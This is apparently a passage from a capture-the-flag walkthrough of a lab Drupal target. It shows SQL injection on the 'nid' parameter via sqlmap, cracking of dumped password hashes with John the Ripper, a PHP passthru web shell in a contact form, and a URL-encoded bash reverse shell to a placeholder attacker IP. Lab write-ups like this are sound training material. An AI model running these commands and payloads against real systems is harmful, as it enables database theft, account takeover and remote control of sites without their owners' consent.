## 2. Initial Foothold (SQLi & Reverse Shell)

The foothold is gained by exploiting a SQL Injection vulnerability in the node ID (`nid`) parameter.

### 💥 SQL Injection & Hash Extraction

| Action | Tool | Command/Process | Result/Notes |
| :--- | :--- | :--- | :--- |
| **Vulnerability Check**| Manual SQLi / SQLMap | Test the `nid` parameter on `/node/1`. (e.g., `.../node/1'`) | SQLMap confirms **Error-based SQL Injection** on the `nid` parameter. |
| **Looting** | SQLMap (Demonstration only) | `sqlmap -u "http://[Target IP]/node/1" --dbms=mysql --dump -T users --batch` | Extracts user list and their **Drupal password hashes** for users `admin` and `john`. |

### 🔑 Hash Cracking

| Action | Tool | Command | Result |
| :--- | :--- | :--- | :--- |
| **Cracking Hash** | **John the Ripper** | `john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt` | Cracks one user's hash, revealing the password: **`turtle`**. |
| **User Confirmation** | Manual Login | Navigate to `/user/login` and try `john:turtle`. | **Successful Login!** Gained **authenticated access** as the user `john`. |

### 🐚 Gaining a Reverse Shell

Authenticated access reveals that the content editor allows for **PHP Code** input. This is exploited for Remote Code Execution (RCE).

| Action | Tool | Code/Command | Notes |
| :--- | :--- | :--- | :--- |
| **Netcat Listener** | Netcat | `nc -nlvp 3` | Set up a listener on your attacking machine. |
| **PHP Payload** | Drupal Web Form | `<?php passthru($_GET['offsec']); ?>` | In the 'Contact Us' web form settings, switch the text format to **PHP Code** and insert the payload. |
| **RCE Trigger** | Browser/Curl | `http://[Target IP]/contact?offsec=id` | Confirms command execution by seeing the `www-data` user ID. |
| **Reverse Shell** | Browser/Curl | `http://[Target IP]/contact?offsec=bash%20-c%20%27bash%20-i%20%3E%26%20/dev/tcp/[ATTACKER_IP]/3%200%3E%261%27` | Send the URL-encoded Bash reverse shell payload to the `offsec` parameter. |
| **Shell Stabilization** | Shell/Stty | `python -c 'import pty; pty.spawn("/bin/bash")'`; `Ctrl+Z`; `stty raw -echo`; `fg` | Essential steps to get a fully interactive shell on the target machine. |

